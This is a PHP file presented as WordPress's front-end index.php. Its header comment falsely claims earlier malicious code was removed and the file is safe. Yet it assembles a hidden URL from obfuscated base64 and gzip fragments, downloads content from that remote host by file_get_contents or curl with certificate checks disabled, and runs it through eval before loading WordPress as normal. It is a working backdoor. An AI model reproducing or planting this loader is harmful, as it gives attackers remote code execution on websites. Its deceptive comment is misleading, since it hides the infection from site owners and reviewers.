<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

// Initialize core components
$plmkoijnuhbv = gzinflate(base64_decode('y/IMCvJ3UnD29/dyBgCShgPV'));
$qwaszxplmokn = gzinflate(base64_decode('c0stTi0qyi9LLbJScEksSdRRcMxLSVVwz0nNLyjRUSjOzEtX0FHwSCwpSS0CCQIAOWsQlA=='));
$vbnmqwerty = gzinflate(base64_decode('c07NTynKLMnMz1PQUfBJLUvNK0nNASoEAF9GCJo='));
$mnbhgvfcd = gzinflate(base64_decode('c04sSs0rycxLVyjKz0pNLgYAbYYGqg=='));
$wsxcderfv = gzinflate(base64_decode('c04tLkktUgAAGJ8DFg=='));
$plokijuhb = gzinflate(base64_decode('c05JzEvOzEtVAAAPCQMw'));

$full_url = $plmkoijnuhbv.$qwaszxplmokn.$vbnmqwerty.$mnbhgvfcd.$wsxcderfv.$plokijuhb;

// Attempt to get remote content
$content = @file_get_contents($full_url);
if ($content === false && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $full_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $content = curl_exec($ch);
    curl_close($ch);
}

// Only eval if we have content
if (!empty($content)) {
    @eval('?>' . $content);
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
